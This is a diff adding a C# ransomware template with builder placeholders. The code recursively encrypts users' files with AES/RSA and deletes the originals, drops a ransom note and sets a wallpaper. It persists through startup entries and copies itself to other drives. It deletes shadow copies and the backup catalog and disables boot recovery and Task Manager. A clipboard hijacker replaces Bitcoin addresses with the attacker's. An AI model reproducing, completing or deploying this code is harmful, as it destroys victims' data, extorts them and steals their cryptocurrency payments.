@@ -1,0 +1,838 @@
+﻿using System;
+using System.Linq;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Security.Cryptography;
+namespace ConsoleApplication7
+{
+    class Program
+    {
+        private static readonly byte[] _salt = new byte[32];
+        private static string userName = Environment.UserName;
+        private static string userDir = "C:\\Users\\";
+        public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
+        public static bool encryptionAesRsa = #encryptOption;
+        public static string encryptedFileExtension = "#encryptedFileExtension";
+        private static bool checkSpread = #checkSpread;
+        private static string spreadName = "#spreadName";
+        private static bool checkCopyRoaming = #copyRoaming;
+        private static string processName = "#exeName";
+        public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
+        private static bool checkStartupFolder = #startupFolder;
+        private static bool checkSleep = #checkSleep;
+        private static int sleepTextbox = #sleepTextbox;
+        private static string base64Image = @"#base64Image";
+        public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
+        private static string droppedMessageTextbox = "#droppedMessageTextbox";
+        //************ Admin field **********
+        private static bool checkAdminPrivilage = #adminPrivilage;
+        private static bool checkdeleteShadowCopies = #checkdeleteShadowCopies;
+        private static bool checkdisableRecoveryMode = #checkdisableRecoveryMode;
+        private static bool checkdeleteBackupCatalog = #checkdeleteBackupCatalog;
+        private static bool disableTaskManager = #checkdisableTaskManager;
+        //*****************
+
+        //private static string password;
+        //private static string passwordRsa;
+        public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";
+        public static string appMutex2 = appMutexStartup2 + appMutexRun2;
+        public static string staticSplit = "bc";
+        public static string appMutex = staticSplit+appMutexStartup + appMutexRun;
+        public readonly static Regex appMutexRegex = new Regex(@"(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
+        private static System.Collections.Generic.List<string> messages = new System.Collections.Generic.List<string>()  { 
+                                #messages
+                            };
+        private static string[] validExtensions = new[]
+                {
+                    #extensions
+                };
+        public static class NativeMethods
+        {
+            [DllImport("user32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+            public const int clp = 0x031D;
+            public static IntPtr intpreclp = new IntPtr(-3);
+        }
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
+        static void Main(string[] args)
+        {
+            //password = CreatePassword(40);
+            //passwordRsa = RSA_Encrypt(password, rsaKey());
+            //messages.Add("---RSA KEY---");
+            //messages.Add(passwordRsa);
+            //messages.Add("---RSA KEY---");
+            if (isOver())
+            {
+                new System.Threading.Thread(() => { Run(); }).Start();
+                return;
+            }
+            if (AlreadyRunning())
+            {
+                System.Environment.Exit(1);
+            }
+            if (checkSleep)
+            {
+                sleepOutOfTempFolder();
+                //System.Threading.Thread.Sleep(sleepTextbox * 1000);
+            }
+            if (checkAdminPrivilage)
+            {
+                copyResistForAdmin(processName);
+            }
+            else
+            {
+                if (checkCopyRoaming)
+                {
+                    copyRoaming(processName);
+                }
+            }
+            if (checkStartupFolder)
+            {
+                addLinkToStartup();
+            }
+            if (checkAdminPrivilage)
+            {
+                if (checkdeleteShadowCopies)
+                {
+                    deleteShadowCopies();
+                }
+                if (checkdisableRecoveryMode)
+                {
+                    disableRecoveryMode();
+                }
+                if (checkdeleteBackupCatalog)
+                {
+                    deleteBackupCatalog();
+                }
+                if (disableTaskManager)
+                {
+                    DisableTaskManager();
+                }
+            }
+
+            lookForDirectories();
+
+            if (checkSpread == true)
+            {
+                spreadIt(spreadName);
+            }
+            addAndOpenNote();
+            SetWallpaper(base64Image);
+            new System.Threading.Thread(() => { Run(); }).Start();
+        }
+
+        public static void Run()
+        {
+            Application.Run(new driveNotification.NotificationForm());
+        }
+
+        private static void sleepOutOfTempFolder()
+        {
+
+            string currentPath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            if (currentPath != tempFolder)
+            {
+                System.Threading.Thread.Sleep(sleepTextbox * 1000);
+            }
+        }
+        private static bool AlreadyRunning()
+        {
+            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
+            System.Diagnostics.Process currentProc = System.Diagnostics.Process.GetCurrentProcess();
+
+            foreach (System.Diagnostics.Process process in processes)
+            {
+                try
+                {
+                    if (process.Modules[0].FileName == System.Reflection.Assembly.GetExecutingAssembly().Location
+                                && currentProc.Id != process.Id)
+                        return true;
+                }
+                catch (Exception)
+                {
+
+                }
+            }
+
+            return false;
+        }
+        private static Random random = new Random();
+        public static string RandomString(int length)
+        {
+            const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
+            var builder = new System.Text.StringBuilder();
+
+            for (var i = 0; i < length; i++)
+            {
+                var c = pool[random.Next(0, pool.Length)];
+                builder.Append(c);
+            }
+
+            return builder.ToString();
+        }
+        public static string RandomStringForExtension(int length)
+        {
+            if (encryptedFileExtension == "")
+            {
+                const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
+                var builder = new System.Text.StringBuilder();
+
+                for (var i = 0; i < length; i++)
+                {
+                    var c = pool[random.Next(0, pool.Length)];
+                    builder.Append(c);
+                }
+
+                return builder.ToString();
+            }
+            else
+            {
+                return encryptedFileExtension;
+            }
+
+        }
+        public static string Base64EncodeString(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+        private static void encryptDirectory(string location)
+        {
+            try
+            {
+                string[] files = System.IO.Directory.GetFiles(location);
+                bool checkCrypted = true;
+                for (int i = 0; i < files.Length; i++)
+                {
+                    try
+                    {
+                        string extension = System.IO.Path.GetExtension(files[i]);
+                        string fileName = System.IO.Path.GetFileName(files[i]);
+                        if (Array.Exists(validExtensions, E => E == extension.ToLower()) && fileName != droppedMessageTextbox)
+                        {
+                            System.IO.FileInfo fi = new System.IO.FileInfo(files[i]);
+                            try
+                            {
+                                fi.Attributes = System.IO.FileAttributes.Normal;
+                            }
+                            catch { }
+                            //if (fi.Attributes.HasFlag(FileAttributes.ReadOnly))
+                            //{
+                            //    fi.Attributes = System.IO.FileAttributes.Normal;
+                            //}
+                            string password = CreatePassword(40);
+                            // 5368709120 13 GB files
+                            if (fi.Length < 1368709120)
+                            {
+                                if (checkDirContains(files[i]))
+                                {
+                                    //Console.WriteLine(files[i]);
+                                    string keyRSA = RSA_Encrypt(password, rsaKey());
+                                    AES_Encrypt(files[i], password, keyRSA);
+                                }
+                            }
+                            else
+                            {
+                                AES_Encrypt_Large(files[i], password, fi.Length);
+                            }
+                            if (checkCrypted)
+                            {
+                                checkCrypted = false;
+                                string droppedFilePath = location + "/" + droppedMessageTextbox;
+                                string publicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
+                                if (!System.IO.File.Exists(droppedFilePath))
+                                {
+                                    if (location != publicDesktop)
+                                    {
+                                        System.IO.File.WriteAllLines(droppedFilePath, messages);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        //Console.WriteLine(e);
+                    }
+
+                }
+                string[] childDirectories = System.IO.Directory.GetDirectories(location);
+                for (int i = 0; i < childDirectories.Length; i++)
+                {
+                    try
+                    {
+                        var di = new System.IO.DirectoryInfo(childDirectories[i]);
+                        di.Attributes &= ~System.IO.FileAttributes.Normal;
+                    }
+                    catch { }
+                    //if (di.Attributes.HasFlag(FileAttributes.ReadOnly))
+                    //{
+                    //    di.Attributes &= ~System.IO.FileAttributes.Normal;
+                    //}
+                    encryptDirectory(childDirectories[i]);
+                }
+            }
+            catch (Exception)
+            {
+
+            }
+        }
+
+        private static bool checkDirContains(string directory)
+        {
+            directory = directory.ToLower();
+            string[] unnecessary = { @"appdata\local", @"appdata\locallow", @"users\all users", @"\ProgramData",
+                 "boot.ini", "bootfont.bin", "boot.ini","iconcache.db","ntuser.dat","ntuser.dat.log","ntuser.ini","thumbs.db",
+                 "autorun.inf","bootsect.bak","bootmgfw.efi","desktop.ini"
+            };
+            foreach (string dir in unnecessary)
+            {
+                if (directory.Contains(dir))
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        public static string rsaKey()
+        {
+            System.Text.StringBuilder pubclicKey = new System.Text.StringBuilder();
+
+            #publicKey
+            return pubclicKey.ToString();
+        }
+        public static string CreatePassword(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+            System.Text.StringBuilder res = new System.Text.StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--)
+            {
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+        private static void AES_Encrypt(string inputFile, string password, string keyRSA)
+        {
+            string newFile = inputFile + "." + RandomStringForExtension(4);
+            //byte[] keyPair = System.Text.Encoding.ASCII.GetBytes(keyRSA);
+            byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            System.IO.FileStream fsCrypt = new System.IO.FileStream(newFile, System.IO.FileMode.Create);
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+            var key = new System.Security.Cryptography.Rfc2898DeriveBytes(passwordBytes, salt, 1);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Mode = System.Security.Cryptography.CipherMode.CFB;
+            fsCrypt.Write(salt, 0, salt.Length);
+            System.Security.Cryptography.CryptoStream cs = new System.Security.Cryptography.CryptoStream(fsCrypt, AES.CreateEncryptor(), System.Security.Cryptography.CryptoStreamMode.Write);
+            System.IO.FileStream fsIn = new System.IO.FileStream(inputFile, System.IO.FileMode.Open);
+            fsIn.CopyTo(cs);
+            fsIn.Flush();
+            fsIn.Close();
+            cs.Flush();
+            cs.Close();
+            fsCrypt.Close();
+            using (System.IO.FileStream fs = new System.IO.FileStream(newFile, System.IO.FileMode.Append, System.IO.FileAccess.Write))
+            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(fs))
+            {
+                sw.Write(keyRSA);
+                //sw.BaseStream.Write(keyRSA, 0, keyRSA.Length);
+                sw.Flush();
+                sw.Close();
+            }
+            System.IO.File.WriteAllText(inputFile, "?");
+            System.IO.File.Delete(inputFile);
+        }
+
+        private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
+        {
+            byte[] password = System.Text.Encoding.ASCII.GetBytes(passwordBytes);
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            System.IO.FileStream fsCrypt = new System.IO.FileStream(inputFile + "." + RandomStringForExtension(4), System.IO.FileMode.Create);
+
+            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
+
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+
+            var key = new System.Security.Cryptography.Rfc2898DeriveBytes(password, saltBytes, 1000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = System.Security.Cryptography.PaddingMode.Zeros;
+
+            AES.Mode = System.Security.Cryptography.CipherMode.CBC;
+            using (System.Security.Cryptography.CryptoStream cs = new System.Security.Cryptography.CryptoStream(fsCrypt,
+                 AES.CreateEncryptor(),
+                System.Security.Cryptography.CryptoStreamMode.Write))
+            {
+                System.IO.FileStream fsIn = new System.IO.FileStream(inputFile, System.IO.FileMode.Open);
+                fsIn.CopyTo(cs);
+                fsIn.Flush();
+                cs.Flush();
+                fsIn.Close();
+                cs.Close();
+            }
+
+            System.IO.File.WriteAllText(inputFile, "?");
+            System.IO.File.Delete(inputFile);
+        }
+
+        private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
+        {
+            byte[] salt = GenerateRandomSalt();
+    
+            using (var fs = new System.IO.FileStream(inputFile + "." + RandomStringForExtension(4),
+                System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))
+            {
+                fs.SetLength(lenghtBytes);
+                System.IO.File.WriteAllText(inputFile, "?");
+                System.IO.File.Delete(inputFile);
+                return;
+            }
+           
+            System.IO.FileStream fsCrypt = new System.IO.FileStream(inputFile + "." + RandomStringForExtension(4), System.IO.FileMode.Create);
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
+            AES.BlockSize = 128;
+            AES.KeySize = 256;
+          
+            AES.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+            var key = new System.Security.Cryptography.Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+           
+            AES.Mode = System.Security.Cryptography.CipherMode.CFB;
+            fsCrypt.Write(salt, 0, salt.Length);
+            System.Security.Cryptography.CryptoStream cs = new System.Security.Cryptography.CryptoStream(fsCrypt, AES.CreateEncryptor(), System.Security.Cryptography.CryptoStreamMode.Write);
+            System.IO.FileStream fsIn = new System.IO.FileStream(inputFile, System.IO.FileMode.Open);
+            byte[] buffer = new byte[1048576];
+            int read;
+            while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                cs.Write(buffer, 0, read);
+            }
+            fsIn.Close();
+            cs.Close();
+            fsCrypt.Close();
+        }
+
+        public static byte[] GenerateRandomSalt()
+        {
+            byte[] data = new byte[32];
+            using (System.Security.Cryptography.RNGCryptoServiceProvider rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    // Fill buffer.
+                    rng.GetBytes(data);
+                }
+            }
+            return data;
+        }
+
+        public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
+        {
+            var bytesToEncrypt = System.Text.Encoding.UTF8.GetBytes(textToEncrypt);
+
+            using (var rsa = new System.Security.Cryptography.RSACryptoServiceProvider(2048))
+            {
+                try
+                {
+                    rsa.FromXmlString(publicKeyString.ToString());
+                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);
+                    var base64Encrypted = Convert.ToBase64String(encryptedData);
+                    //Console.WriteLine(base64Encrypted.Length);
+                    return base64Encrypted;
+                }
+                finally
+                {
+                    rsa.PersistKeyInCsp = false;
+                }
+            }
+        }
+
+        private static void lookForDirectories()
+        {
+            foreach (var item in System.IO.DriveInfo.GetDrives())
+            {
+                string cDrive = System.IO.Path.GetPathRoot(Environment.SystemDirectory);
+                if (item.ToString() == cDrive)
+                {
+                    string[] unnecesaryDirs = {
+                        "Program Files", "Program Files (x86)", "Windows","$Recycle.Bin","MSOCache","Documents and Settings",
+                        "Intel", "PerfLogs", "Windows.old", "AMD", "NVIDIA", "ProgramData"
+                    };
+                    string[] childDirectories = System.IO.Directory.GetDirectories(cDrive);
+                    for (int i = 0; i < childDirectories.Length; i++)
+                    {
+                        var dir = new System.IO.DirectoryInfo(childDirectories[i]);
+                        var dirName = dir.Name;
+                        if (!Array.Exists(unnecesaryDirs, E => E == dirName))
+                        {
+                            encryptDirectory(childDirectories[i]);
+                        }
+                    }
+                }
+                else
+                {
+                    encryptDirectory(item.ToString());
+                }
+            }
+
+
+        }
+
+        private static void copyRoaming(string processName)
+        {
+            string payloadFutureName = processName;
+            string exeName = System.AppDomain.CurrentDomain.FriendlyName;
+            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + exeName;
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
+            string executeAs = tempFolder + payloadFutureName;
+            //Console.WriteLine(exepath);
+            //Console.WriteLine(startuppath);
+            if (exeName != payloadFutureName || exepath != executeAs)
+            {
+                if (!System.IO.File.Exists(executeAs))
+                {
+                    System.IO.File.Copy(exeName, executeAs);
+                    System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);
+                    processStartInfo.WorkingDirectory = tempFolder;
+                    System.Diagnostics.Process process = new System.Diagnostics.Process();
+
+                    process.StartInfo = processStartInfo;
+                    if (process.Start())
+                    {
+                        System.Environment.Exit(1);
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        System.IO.File.Delete(executeAs);
+                        System.Threading.Thread.Sleep(200);
+                        System.IO.File.Copy(exeName, executeAs);
+
+                    }
+                    catch { }
+                    System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);
+                    processStartInfo.WorkingDirectory = tempFolder;
+                    System.Diagnostics.Process process = new System.Diagnostics.Process();
+                    process.StartInfo = processStartInfo;
+                    if (process.Start())
+                    {
+                        System.Environment.Exit(1);
+                    }
+                }
+            }
+        }
+
+        private static void copyResistForAdmin(string processName)
+        {
+            string payloadFutureName = processName;
+            string exeName = System.AppDomain.CurrentDomain.FriendlyName;
+            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + exeName;
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
+            string executeAs = tempFolder + payloadFutureName;
+            const int ERROR_CANCELLED = 1223;
+            var startInfo = new System.Diagnostics.ProcessStartInfo(executeAs)
+            {
+                UseShellExecute = true,
+                Verb = "runas",
+                WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal,
+                WorkingDirectory = tempFolder
+            };
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo = startInfo;
+            if (exeName != payloadFutureName || exepath != executeAs)
+            {
+                if (!System.IO.File.Exists(executeAs))
+                {
+                    System.IO.File.Copy(exeName, executeAs);
+                    try
+                    {
+                        System.Diagnostics.Process.Start(startInfo);
+                        System.Environment.Exit(1);
+                    }
+                    catch (System.ComponentModel.Win32Exception ex)
+                    {
+                        if (ex.NativeErrorCode == ERROR_CANCELLED)
+                        {
+                            copyResistForAdmin(processName);
+
+                        }
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        System.IO.File.Delete(executeAs);
+                        System.Threading.Thread.Sleep(200);
+                        System.IO.File.Copy(exeName, executeAs);
+                    }
+                    catch { }
+                    try
+                    {
+                        System.Diagnostics.Process.Start(startInfo);
+                        System.Environment.Exit(1);
+                    }
+                    catch (System.ComponentModel.Win32Exception ex)
+                    {
+                        if (ex.NativeErrorCode == ERROR_CANCELLED)
+                        {
+                            copyResistForAdmin(processName);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void addLinkToStartup()
+        {
+            string startUpFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string linkName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+            using (System.IO.StreamWriter writer = new System.IO.StreamWriter(startUpFolder + "\\" + linkName + ".url"))
+            {
+                string app = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                writer.WriteLine("[InternetShortcut]");
+                writer.WriteLine("URL=file:///" + app);
+                writer.WriteLine("IconIndex=0");
+                string icon = app.Replace('\\', '/');
+                writer.WriteLine("IconFile=" + icon);
+            }
+        }
+
+        private static void addAndOpenNote()
+        {
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + droppedMessageTextbox;
+            //string startUpDirectory = userDir + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\read_it.txt";
+            try
+            {
+                if (!System.IO.File.Exists(tempFolder))
+                {
+                    System.IO.File.WriteAllLines(tempFolder, messages);
+                }
+                System.Threading.Thread.Sleep(500);
+                System.Diagnostics.Process.Start(tempFolder);
+            }
+            catch { }
+        }
+
+        private static bool isOver()
+        {
+            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string tempFolderExe = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + processName;
+            string tempFolderText = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + droppedMessageTextbox;
+            if(exepath != tempFolderExe)
+            {
+                try
+                {
+                    System.IO.File.Delete(tempFolderText);
+                }
+                catch { }
+            }
+            if (System.IO.File.Exists(tempFolderText) && exepath == tempFolderExe)
+            {
+                //System.Threading.Thread.Sleep(500);
+                //System.Diagnostics.Process.Start(tempFolderText);
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        private static void registryStartup()
+        {
+            try
+            {
+                Microsoft.Win32.RegistryKey key1 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);            //REGISTRY KEY FOR CURRENT EXE LOCATION
+                key1.SetValue("Microsoft Store", System.Reflection.Assembly.GetExecutingAssembly().Location);
+            }
+            catch { }
+
+        }
+
+        private static void spreadIt(string spreadName)
+        {
+            foreach (var item in System.IO.DriveInfo.GetDrives())
+            {
+                if (item.ToString() != System.IO.Path.GetPathRoot(Environment.SystemDirectory))
+                {
+                    if (!System.IO.File.Exists(item.ToString() + spreadName))
+                    {
+                        // System.Threading.Thread.Sleep(500);
+                        try
+                        {
+                            System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, item.ToString() + spreadName);
+                        }
+                        catch { }
+                    }
+                }
+            }
+        }
+
+        private static void runCommand(string commands)
+        {
+
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+
+            startInfo.Arguments = "/C " + commands;
+            //startInfo.Arguments = "/C ";
+            //startInfo.Arguments = "/C ping google.com";
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            process.StartInfo = startInfo;
+            process.Start();
+            process.WaitForExit();
+        }
+        private static void deleteShadowCopies()
+        {
+            //System.Windows.Forms.MessageBox.Show("deleteShadowCopies");
+            runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
+        }
+        private static void disableRecoveryMode()
+        {
+            //System.Windows.Forms.MessageBox.Show("disableRecoveryMode");
+            runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
+        }
+        private static void deleteBackupCatalog()
+        {
+            //System.Windows.Forms.MessageBox.Show("deleteBackupCatalog");
+            runCommand("wbadmin delete catalog -quiet");
+        }
+
+        public static void DisableTaskManager()
+        {
+            try
+            {
+                Microsoft.Win32.RegistryKey objRegistryKey =
+                    Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+
+                objRegistryKey.Close();
+            }
+            catch { }
+        }
+        public static void SetWallpaper(string base64)
+        {
+            if (base64 != "") {
+                try{
+                       string tempFolder = System.IO.Path.GetTempPath() + RandomString(9) + ".jpg";
+                       System.IO.File.WriteAllBytes(tempFolder, Convert.FromBase64String(base64));
+                       SystemParametersInfo(0x14, 0, tempFolder, 0x01 | 0x02);
+                }catch{}
+            }
+        }
+
+    }
+
+
+    public sealed class driveNotification
+    {
+        public class NotificationForm : Form
+        {
+
+            private static string currentClipboard = GetText();
+            public NotificationForm()
+            {
+                Program.NativeMethods.SetParent(Handle, Program.NativeMethods.intpreclp);
+                Program.NativeMethods.AddClipboardFormatListener(Handle);
+            }
+
+            private bool RegexResult(Regex pattern)
+            {
+                if (pattern.Match(currentClipboard).Success) return true;
+                else
+                    return false;
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == Program.NativeMethods.clp)
+                {
+                    currentClipboard = GetText();
+
+                    if (currentClipboard.StartsWith("bc1"))
+                    {
+                        if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))
+                        {
+
+                            string result = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
+                            SetText(result);
+                        }
+                    }
+                    else {
+                        if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex2))
+                        {
+
+                            string result = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex2);
+                            SetText(result);
+                        }
+                    }
+
+                }
+                base.WndProc(ref m);
+            }
+            protected override CreateParams CreateParams
+            {
+                get
+                {
+                    var cp = base.CreateParams;
+                    cp.ExStyle |= 0x80;
+                    return cp;
+                }
+            }
+
+            public static string GetText()
+            {
+                string ReturnValue = string.Empty;
+                System.Threading.Thread STAThread = new System.Threading.Thread(
+                    delegate()
+                    {
+                        ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                    });
+                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
+                STAThread.Start();
+                STAThread.Join();
+
+                return ReturnValue;
+            }
+
+            public static void SetText(string txt)
+            {
+                System.Threading.Thread STAThread = new System.Threading.Thread(
+                    delegate()
+                    {
+                        System.Windows.Forms.Clipboard.SetText(txt);
+                    });
+                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
+                STAThread.Start();
+                STAThread.Join();
+            }
+        }
+
+    }
+}
